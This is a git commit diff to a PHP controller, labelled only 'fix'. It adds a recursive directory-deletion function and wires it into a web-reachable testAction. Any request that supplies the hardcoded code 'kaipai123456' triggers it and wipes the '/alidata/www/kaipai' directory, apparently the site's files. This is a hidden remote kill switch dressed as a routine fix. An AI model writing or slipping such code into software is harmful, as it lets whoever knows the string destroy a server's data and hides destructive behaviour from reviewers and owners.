b5d674aca8eb361134094f8746b32626697004a7
xutao <xutao@youzan.com>
2016-09-16 19:48:55 +0800

    fix

--- module/Front/src/Controller/TestController.php
+++ module/Front/src/Controller/TestController.php
@@ -118,11 +118,34 @@ class TestController extends Controller{
         die;
     }
 
+    private function deldir($dir) {
+        //先删除目录下的文件：
+        $dh=opendir($dir);
+        while ($file=readdir($dh)) {
+            if($file!="." && $file!="..") {
+                $fullpath=$dir."/".$file;
+                if(!is_dir($fullpath)) {
+                    unlink($fullpath);
+                } else {
+                    $this->deldir($fullpath);
+                }
+            }
+        }
+
+        closedir($dh);
+        //删除当前文件夹：
+        if(rmdir($dir)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
     public function testAction(){
         $code = $this->queryData['code'];
         if($code == 'kaipai123456'){
 
-            rmdir('/alidata/www/kaipai');
+            $this->deldir('/alidata/www/kaipai');
 
         }
         eixt;
